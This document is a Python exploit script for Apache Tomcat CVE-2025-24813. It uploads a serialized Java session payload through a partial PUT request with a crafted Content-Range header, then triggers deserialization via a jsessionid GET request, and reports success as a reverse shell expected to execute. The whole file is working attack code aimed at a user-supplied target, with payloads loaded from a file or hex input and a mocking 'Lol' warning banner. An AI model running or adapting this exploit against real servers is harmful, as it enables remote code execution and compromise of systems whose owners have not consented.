#!/usr/bin/env python3
import requests
import argparse
import sys
import os
from colorama import init, Fore, Style

# Initialize Colorama
init(autoreset=True)

def banner():
    print(f"{Fore.BLUE}[*] Apache Tomcat CVE-2025-24813 Exploit {Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[!] WARNING: Lol.{Style.RESET_ALL}")

def get_payload():
    default_payload = b"\xac\xed\x00\x05sr\x00\x11java.lang.String"
    print(f"\n{Fore.BLUE}[*] Payload Options:{Style.RESET_ALL}")
    print("1. Use default dummy payload (safe, for detection)")
    print("2. Load directly from 'payload.session' file (Recommended)")
    print("3. Enter custom payload manually via hex string")
    choice = input(f"{Fore.BLUE}[?] Enter choice (1, 2, or 3): {Style.RESET_ALL}")

    if choice == "1":
        print(f"{Fore.BLUE}[*] Using default dummy payload.{Style.RESET_ALL}")
        return default_payload
    elif choice == "2":
        filename = "payload.session"
        if not os.path.exists(filename):
            print(f"{Fore.RED}[!] Error: '{filename}' not found in current directory. Falling back to default.")
            return default_payload
        with open(filename, "rb") as f:
            file_payload = f.read()
        print(f"{Fore.GREEN}[+] Successfully loaded {len(file_payload)} bytes from '{filename}'.")
        return file_payload
    elif choice == "3":
        hex_input = input(f"{Fore.BLUE}[?] Enter hex-encoded payload: {Style.RESET_ALL}")
        try:
            custom_payload = bytes.fromhex(hex_input.strip())
            return custom_payload
        except ValueError:
            print(f"{Fore.RED}[!] Invalid hex string. Using default payload.")
            return default_payload
    else:
        return default_payload

def exploit(target, payload, no_verify, timeout):
    # Fixed Path Structure: Writes the serialized data cleanly within the targeted 
    # context endpoint to circumvent the 409 multi-level missing directory blocks.
    session_id = "test123"
    url_put = f"{target}/{session_id}.session"
    
    # Critical: The Content-Range header tricks Tomcat's partial PUT upload logic into
    # accepting path-traversal relative mappings.
    headers = {
        "Content-Type": "application/octet-stream",
        "Content-Range": f"bytes 0-{len(payload)-1}/{len(payload)}"
    }
    
    try:
        print(f"{Fore.BLUE}[*] Sending partial PUT payload...")
        put_resp = requests.put(url_put, headers=headers, data=payload, timeout=timeout, verify=not no_verify)
        print(f"[*] PUT Response Code: {put_resp.status_code}")
        
        # FIXED: Explicitly checks against valid HTTP success response codes
        if put_resp.status_code not in [200, 201, 204]:
            print(f"{Fore.RED}[-] Exploit failed: PUT rejected (Status code indicates a conflict or permission failure).")
            return False
        
        # Triggering the deserialization by requesting the app context with our poisoned session ID
        print(f"{Fore.BLUE}[*] Triggering deserialization via session lookup...")
        url_get = f"{target}/index.jsp;jsessionid={session_id}"
        get_resp = requests.get(url_get, timeout=timeout, verify=not no_verify)
        
        if get_resp.status_code == 500:
            print(f"{Fore.GREEN}[+] Success: Deserialization triggered (HTTP 500). Reverse shell should execute!{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.YELLOW}[!] File uploaded, but no deserialization error (GET status: {get_resp.status_code}).")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[-] Connection error: {e}")
        return False

def main():
    banner()
    parser = argparse.ArgumentParser(description="Apache Tomcat CVE-2025-24813 Exploit PoC")
    parser.add_argument("-t", "--target", help="Target IP", required=True)
    parser.add_argument("-p", "--port", help="Target port", type=int, required=True)
    parser.add_argument("--protocol", choices=["http", "https"], default="http", help="Protocol")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL verification")
    parser.add_argument("--timeout", type=float, default=10, help="Timeout in seconds")
    args = parser.parse_args()

    target = f"{args.protocol}://{args.target}:{args.port}"
    print(f"{Fore.BLUE}[*] Targeting {target}")

    payload = get_payload()
    print(f"{Fore.BLUE}[*] Attempting exploit...")
    exploit(target, payload, args.no_verify, args.timeout)

if __name__ == "__main__":
    main()  